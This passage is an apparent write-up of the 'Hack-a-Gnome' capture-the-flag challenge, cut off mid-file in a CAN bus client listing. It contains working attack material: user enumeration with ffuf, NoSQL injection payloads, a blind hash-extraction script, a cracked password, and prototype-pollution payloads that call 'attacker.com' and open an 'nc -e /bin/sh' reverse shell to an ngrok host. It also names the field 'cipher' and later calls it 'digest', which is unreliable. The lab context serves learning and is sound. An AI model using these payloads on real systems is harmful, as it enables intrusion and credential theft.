              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../snowblind_ambush/" class="md-nav__link">
        
  
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 2h14v14H5zm2 2v2h10V7zm0 4v2h10v-2zm0 4v2h7v-2z"/></svg>
  
  <span class="md-ellipsis">
    Snowblind ambush
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="hack-a-gnome">Hack-a-Gnome<a class="headerlink" href="#hack-a-gnome" title="Permanent link">⚓︎</a></h1>
<p><img alt="Hack-a-Gnome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_0.png" /></p>
<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M309.5-18.9c-4.1-8-12.4-13.1-21.4-13.1s-17.3 5.1-21.4 13.1l-73.6 144.2-159.9 25.4c-8.9 1.4-16.3 7.7-19.1 16.3s-.5 18 5.8 24.4l114.4 114.5-25.2 159.9c-1.4 8.9 2.3 17.9 9.6 23.2s16.9 6.1 25 2l144.4-73.4L432.4 491c8 4.1 17.7 3.3 25-2s11-14.2 9.6-23.2l-25.3-159.9 114.4-114.5c6.4-6.4 8.6-15.8 5.8-24.4s-10.1-14.9-19.1-16.3L383 125.3z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M288.1-32c9 0 17.3 5.1 21.4 13.1L383 125.3l159.9 25.4c8.9 1.4 16.3 7.7 19.1 16.3s.5 18-5.8 24.4L441.7 305.9 467 465.8c1.4 8.9-2.3 17.9-9.6 23.2s-17 6.1-25 2l-144.3-73.4L143.8 491c-8 4.1-17.7 3.3-25-2s-11-14.2-9.6-23.2l25.2-159.9L20 191.4c-6.4-6.4-8.6-15.8-5.8-24.4s10.1-14.9 19.1-16.3l159.9-25.4 73.6-144.2c4.1-8 12.4-13.1 21.4-13.1zm0 76.8L230.3 158c-3.5 6.8-10 11.6-17.6 12.8l-125.5 20 89.8 89.9c5.4 5.4 7.9 13.1 6.7 20.7l-19.8 125.5 113.3-57.6c6.8-3.5 14.9-3.5 21.8 0l113.3 57.6-19.8-125.5c-1.2-7.6 1.3-15.3 6.7-20.7l89.8-89.9-125.5-20c-7.6-1.2-14.1-6-17.6-12.8z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M288.1-32c9 0 17.3 5.1 21.4 13.1L383 125.3l159.9 25.4c8.9 1.4 16.3 7.7 19.1 16.3s.5 18-5.8 24.4L441.7 305.9 467 465.8c1.4 8.9-2.3 17.9-9.6 23.2s-17 6.1-25 2l-144.3-73.4L143.8 491c-8 4.1-17.7 3.3-25-2s-11-14.2-9.6-23.2l25.2-159.9L20 191.4c-6.4-6.4-8.6-15.8-5.8-24.4s10.1-14.9 19.1-16.3l159.9-25.4 73.6-144.2c4.1-8 12.4-13.1 21.4-13.1zm0 76.8L230.3 158c-3.5 6.8-10 11.6-17.6 12.8l-125.5 20 89.8 89.9c5.4 5.4 7.9 13.1 6.7 20.7l-19.8 125.5 113.3-57.6c6.8-3.5 14.9-3.5 21.8 0l113.3 57.6-19.8-125.5c-1.2-7.6 1.3-15.3 6.7-20.7l89.8-89.9-125.5-20c-7.6-1.2-14.1-6-17.6-12.8z"/></svg></span><br/>
<strong>Direct link</strong>: <a href="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com?id=c8196dc2-72fe-40bd-9878-13154a1de00a" rel="noopener" target="_blank">Hack-a-Gnome</a><br/>
<strong>Area</strong>: The Datacenter<br/> 
<strong>In-game avatar</strong>: Chris Davis</p>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
<details class="tip">
<summary>Hint 1</summary>
<p>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</p>
</details>
<details class="tip">
<summary>Hint 2</summary>
<p>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</p>
</details>
<details class="tip">
<summary>Hint 3</summary>
<p>I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).</p>
</details>
<details class="tip">
<summary>Hint 4</summary>
<p>Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</p>
</details>
<details class="tip">
<summary>Hint 5</summary>
<p>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</p>
</details>
<details class="tip">
<summary>Hint 6</summary>
<p>Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</p>
</details>
<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
<div class="admonition question">
<p class="admonition-title">Request</p>
<p>Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun.</p>
</div>
<details class="quote">
<summary>Chris Davis</summary>
<p>Hey, I could really use another set of eyes on this gnome takeover situation.<br/></p>
<p>Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!<br/></p>
<p>But every system has weaknesses if you know where to look.<br/></p>
<p>If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.<br/></p>
<p>Ready to help me turn one of these rebellious bots against its own kind?<br/></p>
</details>
<h2 id="high-level-steps">High-Level Steps<a class="headerlink" href="#high-level-steps" title="Permanent link">⚓︎</a></h2>
<ol>
<li><strong>Compromise Access</strong> – Enumerate users and exploit NoSQL injection to obtain valid credentials.</li>
<li><strong>Escalate Control</strong> – Use prototype pollution to achieve remote command execution.</li>
<li><strong>Take Over Hardware</strong> – Modify CAN bus commands to fully control the smart gnome.</li>
</ol>
<pre class="mermaid"><code>%%{init: {"themeVariables": {
  "fontSize": "20px",
  "nodeTextSize": "18px",
  "clusterTextSize": "22px"
}}}%%
flowchart TD

  subgraph Phase1["Compromise Access"]
    A[Bruteforce existing users]
    B[NoSQL injection]
    C[Extract password hash]
    D[Crack hash]
    E[Login to app]
    A --&gt; B --&gt; C --&gt; D --&gt; E
  end

  subgraph Phase2["Escalate Control"]
    F[Prototype pollution]
    G[Template injection]
    H[Remote command execution]
    I[Reverse shell]
    F --&gt; G --&gt; H --&gt; I
  end

  subgraph Phase3["Take Over Hardware"]
    J[Access CAN bus client]
    K[Bruteforce CAN IDs]
    L[Fix movement mapping]
    M[Control gnome]
    N[Shutdown factory]
    J --&gt; K --&gt; L --&gt; M --&gt; N
  end

  Phase1 --&gt; Phase2 --&gt; Phase3</code></pre>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
<ul>
<li>Find a user we can login with<ul>
<li>Found /userAvailable indicating if a given user exists or not</li>
<li>brute force /userAvailable with common names to get the users</li>
</ul>
</li>
<li>Login with the user<ul>
<li>Find the sql injection in /userAvailable</li>
<li>Brute force the password hash</li>
<li>Crack the hash to get the password for the user</li>
</ul>
</li>
<li>Get the canbus_client.py from the remote machine<ul>
<li>Get RCE on the remote machine using the prototype injection</li>
<li>Download the canbus_client.py and README.md from the remote machine</li>
</ul>
</li>
<li>Control the gnome move with modified canbus_client.py<ul>
<li>Bruteforce the command map with different hex ranges</li>
<li>Control the gnome with correct command map</li>
</ul>
</li>
</ul>
<p>On the register page, when we put the username, we see /userAvailable endpoint which takes the endpoint and responds if the username is available or not. <br/>
If username is available, Its new user.<br/>
If username is not available, Its existing user.</p>
<p><img alt="Img1" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_3.png" /></p>
<p>So we brute force with common names. <br/>
Below ignores response for names which dont include in the response body.<br/>
"available":true</p>
<p><div class="highlight"><pre><span></span><code><span class="n">ffuf</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ&amp;id=5a219bfd-8362-4ea9-80ff-25e5762d78f4&#39;</span> <span class="o">-</span><span class="n">fr</span> \<span class="s2">&quot;available</span><span class="se">\&quot;</span><span class="s2">:true -v -rate 25</span>
</code></pre></div>
Two existing user names found:
- bruce
- harold</p>
<p><img alt="Img1" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_usernames_found.png" /></p>
<p>We can verify this via burp suite.<br>
<img alt="Img1" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_4.png" /></p>
<p>Now we find a SQL injection vulnerability in /userAvailable <br/>
All my attempts of using standard SQL injection attempts fail.
e.g.
<code>bruce' OR 1=1 --</code> or URL encoded <code>bruce%27%20OR%201%3D1%20--</code>
so, use a standard NoSQL injection payload
<code>bruce{"$ne":null}</code> or URL encoded <code>bruce%7B%22%24ne%22%3Anull%7D</code></p>
<p>and we see <code>Microsoft.Azure.Documents.Common/2.14.0</code> in the response.
<img alt="Img1" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_5.png" />
Microsoft.Azure.Documents.Common is an internal .NET library used by Azure Cosmos DB (formerly DocumentDB). So the database used here is the Azure Cosmos DB.</p>
<p>The below hint is useful <br/></p>
<details class="hint">
<summary>Hint</summary>
<p>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash.</p>
</details>
<p>We use <a href="https://docs.azure.cn/en-us/cosmos-db/query/is-defined">IS_DEFINED</a> to find the column name which may contain the password (hashed/encrypted/plain text, we dont know).</p>
<p>Tried a lot of words:
hash, password_hash, hash, digest, token, secret, password, checksum, signature, auth, credential
in the {placeholder}<br/>
payload <code>bruce" AND IS_DEFINED(c.{placeholder}) -- '</code> <br/>
URL encoded <code>bruce%22%20AND%20IS_DEFINED(c.{placeholder})%20--%20%27</code><br/></p>
<p>Every single one of then responded with <code>{"available":true}</code> except <strong>"cipher"</strong> responded with <code>{"available":false}</code><br/></p>
<p>payload <code>bruce" AND IS_DEFINED(c.cipher) -- '</code> <br/>
URL encoded <code>bruce%22%20AND%20IS_DEFINED(c.cipher)%20--%20%27</code><br/></p>
<p><img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_6.png" /></p>
<p>This confirms the name of field/column containing the password hash is "digest". <br/></p>
<p>At this point we dont know what the format it. So we start with easier one - the MD5.
MD5 has exactly 32 characters. So, we send each character possible in an MD5 hash [character a-f and number 0-9] to the /userAvailable looking for that character in every position in the "digest" field.
If we get {available:false}, It means thats the character in that position in the password hash.
Since MD5 hash max length is 32 characters, we loop 32 times.</p>
<details class="tip">
<summary>find_hash_md5.py</summary>
<div class="highlight"><span class="filename">find_hash_md5.py</span><pre><span></span><code>    <span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>

    <span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&quot;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable&quot;</span> 
    <span class="n">ID</span> <span class="o">=</span> <span class="s2">&quot;5a219bfd-8362-4ea9-80ff-25e5762d78f4&quot;</span>
    <span class="n">TARGET_USERNAME</span> <span class="o">=</span> <span class="s2">&quot;bruce&quot;</span>
    <span class="n">MAX_LENGTH</span> <span class="o">=</span> <span class="mi">32</span>  <span class="c1"># Adjust based on hash length</span>

    <span class="c1"># In general MD5 is in hex format for passwords so we can limit to  a-f and 0-9</span>
    <span class="n">CHARSET</span> <span class="o">=</span> <span class="s2">&quot;abcdef0123456789&quot;</span>

    <span class="c1"># Response with &quot;available:false&quot; indicates match</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">is_match</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
        <span class="k">return</span> <span class="s1">&#39;&quot;available&quot;:false&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>

    <span class="c1"># Extracts the password hash</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">extract_digest</span><span class="p">():</span>
        <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
        <span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_LENGTH</span><span class="p">):</span>
            <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
            <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
                <span class="n">injection</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">TARGET_USERNAME</span><span class="si">}</span><span class="s1">&quot; AND SUBSTRING(c.digest,</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s1">,1)=&quot;</span><span class="si">{</span><span class="n">ch</span><span class="si">}</span><span class="s1">&quot; -- &#39;</span>
                <span class="n">encoded_username</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">injection</span><span class="p">)</span>

                <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">?username=</span><span class="si">{</span><span class="n">encoded_username</span><span class="si">}</span><span class="s2">&amp;id=</span><span class="si">{</span><span class="n">ID</span><span class="si">}</span><span class="s2">&quot;</span>
                <span class="c1">#print(f&quot;position {position} character {ch}&quot;)</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
                    <span class="c1">#print(response.text)</span>
                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Request failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="k">continue</span>

                <span class="k">if</span> <span class="n">is_match</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
                    <span class="n">result</span> <span class="o">+=</span> <span class="n">ch</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Char at pos </span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">ch</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
                    <span class="k">break</span>

            <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] No match at position </span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s2">, assuming end of digest.&quot;</span><span class="p">)</span>
                <span class="k">break</span>

        <span class="k">return</span> <span class="n">result</span>

    <span class="c1"># Running the password hash extractor</span>
    <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Starting blind digest extraction for user:&quot;</span><span class="p">,</span> <span class="n">TARGET_USERNAME</span><span class="p">)</span>
        <span class="n">digest</span> <span class="o">=</span> <span class="n">extract_digest</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> Extracted digest:&quot;</span><span class="p">,</span> <span class="n">digest</span><span class="p">)</span>
</code></pre></div>
</details>
<p>For the user "bruce", the hash found was 
<div class="highlight"><pre><span></span><code>d0a9ba00f80cbc56584ef245ffc56b9e
</code></pre></div>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_7.png" /></p>
<p>We use Crackstation.net to get the password for the hash.
The password is <code>oatmeal12</code>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_8.png" /></p>
<p>Now we can login using below credentials. <br/></p>
<p>user     : <code>bruce</code>
password : <code>oatmeal12</code></p>
<p>Upon login, we see stats on the right side and the Gnome control interface on the right side.<br/>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_9.png" /></p>
<p>Any attempt to move the Gnome on the Nome control interface shows the error on the UI.<br/>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_10.png" /></p>
<p>The goal must be to move the Gnome to reach the lever on the top left side.</p>
<p>We see "Update Name" button clicking on which opens a dialog to update the name.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_11.png" /></p>
<p>The update action updates the name.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_12.png" /></p>
<p>The update is reflected in the /stats page
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_13.png" /></p>
<p>There was a hint indicating <strong>protype pollution</strong> in the stats page which uses a template.</p>
<details class="quote">
<summary>Prototype pollution hint</summary>
<p>A backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats.
.....
During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down.</p>
</details>
<p>Rubén Santos García has an awesome blog post on <a href="https://www.kayssel.com/newsletter/issue-24/">Prototype pollution</a> with a section specifically dedicated to RCE on template engine using prototype pollution.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_14.png" /></p>
<div class="highlight"><pre><span></span><code>// Pollution payload
{
  &quot;__proto__&quot;: {
    &quot;outputFunctionName&quot;: &quot;x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl attacker.com?data=$(whoami)&#39;);var __output&quot;
  }
}
</code></pre></div>
<p>The payload which goes is something like this:
<div class="highlight"><pre><span></span><code>{&quot;action&quot;:&quot;update&quot;,&quot;key&quot;:&quot;settings&quot;,&quot;subkey&quot;:&quot;name&quot;,&quot;value&quot;:&quot;poiuy&quot;}
</code></pre></div>
We change it below following the payload in the blog to set the name property with that payload.
<div class="highlight"><pre><span></span><code>{
    &quot;action&quot;:&quot;update&quot;, 
    &quot;key&quot;:&quot;__proto__&quot;, 
    &quot;subkey&quot;:&quot;outputFunctionName&quot;, &quot;value&quot;:&quot;test1;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(whoami)&#39;);test2&quot;
}
</code></pre></div>
We send the below URL encoded version to the endpoint /ctrlsignals?message=
<div class="highlight"><pre><span></span><code>%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%20%22value%22%3A%22test1%3Bprocess.mainModule.require%28%27child_process%27%29.execSync%28%27%24%28whoami%29%27%29%3Btest2%22%7D
</code></pre></div>
We are now able to save the value.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_15.png" /></p>
<p>Now that the template is saved, browsing the <code>/stats</code> page will render the template and will execute that commend.<br/>
We can see <code>root</code> as the output of <code>whoami</code> in the request.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_16.png" /></p>
<p>Saving the request with <code>ls</code> and then browsing the /stats page shows the file listing.<br/>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_17.png" /></p>
<p>This proves the app has the remote command execution via prototype pollution.
We can then get a reverse shell.</p>
<p>Set up ngrok on tcp and local netcat to get the reverse shell.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_18.png" /></p>
<p>We update the above payload with the reverse shell payload. <br/>
So now when the code executes, the app server would call ngrok which would spawn a reverse shell on the netcat on the local kalibox.
<div class="highlight"><pre><span></span><code>{&quot;action&quot;:&quot;update&quot;, &quot;key&quot;:&quot;__proto__&quot;, &quot;subkey&quot;:&quot;outputFunctionName&quot;, &quot;value&quot;:&quot;test1;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(nc -e /bin/sh 4.tcp.ngrok.io 11012)&#39;);test2&quot;}
</code></pre></div></p>
<p><div class="highlight"><span class="filename">URL encoded version</span><pre><span></span><code><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">action</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">update</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">22</span><span class="n">key</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">__proto__</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">22</span><span class="n">subkey</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">outputFunctionName</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">test1</span><span class="o">%</span><span class="mi">3</span><span class="n">Bprocess</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">27</span><span class="n">child_process</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mf">29.</span><span class="n">execSync</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">28</span><span class="n">nc</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">e</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">2</span><span class="n">Fbin</span><span class="o">%</span><span class="mi">2</span><span class="n">Fsh</span><span class="o">%</span><span class="mf">204.</span><span class="n">tcp</span><span class="o">.</span><span class="n">ngrok</span><span class="o">.</span><span class="n">io</span><span class="o">%</span><span class="mi">2013070</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">Btest2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span>
</code></pre></div>
The payload is updated.
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_19.png" /></p>
<p>Accessing the /stats page gives us the reverse shell.<br/>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_20.png" /></p>
<p>Upgrade the shell and copy the contents of canbus_client.py.
<div class="highlight"><pre><span></span><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre></div>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_21.png" /></p>
<p>There are two important files in the remote server - canbus_client.py and README.md.<br/>
canbus_client.py has the mapping of the keystrokes [up, down, left, right] with the CAN IDs.<br/>
The mapping, however is not correct.</p>
<details class="tip">
<summary>canbus_client.py</summary>
<div class="highlight"><span class="filename">canbus_client.py</span><pre><span></span><code>    <span class="c1">#!/usr/bin/python3</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">can</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span> <span class="c1"># To show timestamps for received messages</span>

    <span class="c1"># Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)</span>
    <span class="n">COMMAND_MAP</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;up&quot;</span><span class="p">:</span> <span class="mh">0x656</span><span class="p">,</span>
        <span class="s2">&quot;down&quot;</span><span class="p">:</span> <span class="mh">0x657</span><span class="p">,</span>
        <span class="s2">&quot;left&quot;</span><span class="p">:</span> <span class="mh">0x658</span><span class="p">,</span>
        <span class="s2">&quot;right&quot;</span><span class="p">:</span> <span class="mh">0x659</span><span class="p">,</span>
        <span class="c1"># Add other command IDs if needed</span>
    <span class="p">}</span>
    <span class="c1"># Add &#39;listen&#39; as a special command option</span>
    <span class="n">COMMAND_CHOICES</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span> <span class="o">+</span> <span class="p">[</span><span class="s2">&quot;listen&quot;</span><span class="p">]</span>

    <span class="n">IFACE_NAME</span> <span class="o">=</span> <span class="s2">&quot;gcan0&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send_command</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">command_id</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Sends a CAN message with the given command ID.&quot;&quot;&quot;</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">Message</span><span class="p">(</span>
            <span class="n">arbitration_id</span><span class="o">=</span><span class="n">command_id</span><span class="p">,</span>
